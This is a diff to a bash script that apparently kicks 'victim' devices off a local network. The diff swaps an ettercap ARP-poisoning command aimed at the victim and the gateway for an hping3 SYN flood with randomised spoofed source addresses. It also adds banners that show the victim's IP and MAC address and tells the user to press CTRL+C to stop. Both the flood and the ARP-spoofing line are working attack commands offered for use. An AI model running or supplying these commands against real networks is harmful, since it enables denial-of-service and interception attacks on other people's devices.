@@ -5,7 +5,7 @@ function getDefaultInterface {
 }
 
 function getIPAddress {
-  userIPAddress=$(hostname -I | xargs);
+  userIPAddress=$(hostname -I | awk '{print $1}' | xargs);
 }
 
 function getDefaultGateway {
@@ -76,7 +76,13 @@ function blockAfterSelectIP {
   echo -e " ${YELLOW}Victim IP: ${RED}"$victimIPAddress${WHITE}
   echo -e " ${YELLOW}Victim MAC: ${RED}"$victimMACAddress${WHITE}
 
-  printf "Blocking network access from "$victimIPAddress
-  #until dropbox status | grep -q "100.0%";
-  ettercap -T -q -p -F block.ef -M arp:remote /$victimIPAddress// /$defaultGateway//
+  echo "Blocking network access from "$victimIPAddress"..."
+  printf "\n\n\n"
+  echo -e "${RED}         -> Press CTRL+C to STOP!${WHITE}"
+  printf "\n\n"
+
+
+  hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source $victimIPAddress > /dev/null
 }
+
+#ettercap -T -q -p -F block.ef -M arp:remote /$victimIPAddress// /$defaultGateway//
